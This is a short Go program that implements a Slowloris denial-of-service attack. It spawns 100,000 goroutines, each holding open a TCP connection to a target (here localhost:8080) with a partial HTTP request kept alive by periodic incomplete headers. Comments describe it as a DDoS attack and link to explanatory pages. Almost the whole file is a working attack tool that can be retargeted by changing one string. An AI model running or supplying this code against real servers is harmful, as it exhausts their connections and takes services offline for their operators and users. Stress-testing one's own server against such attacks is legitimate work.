package main

import (
	"fmt"
	"net"
	"time"
)

// Slowloris DDoS attack
// attempts to overwhelm a targeted server by opening and
// maintaining many simultaneous HTTP connections to the target.
// https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/
// https://en.wikipedia.org/wiki/Slowloris_(cyber_attack)

func main() {
	target := "localhost:8080"
	connections := 100000 //100000

	for i := 0; i < connections; i++ {
		go slowloris(target)
	}

	// Keep the main goroutine running
	select {}
}

func slowloris(target string) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	// Send partial HTTP request
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
	fmt.Fprintf(conn, "Host: %s\r\n", target)
	fmt.Fprintf(conn, "User-Agent: Mozilla/5.0\r\n")

	for {
		// Send incomplete header periodically
		fmt.Fprintf(conn, "X-a: %d\r\n", time.Now().UnixNano())
		time.Sleep(10 * time.Second)
	}
}
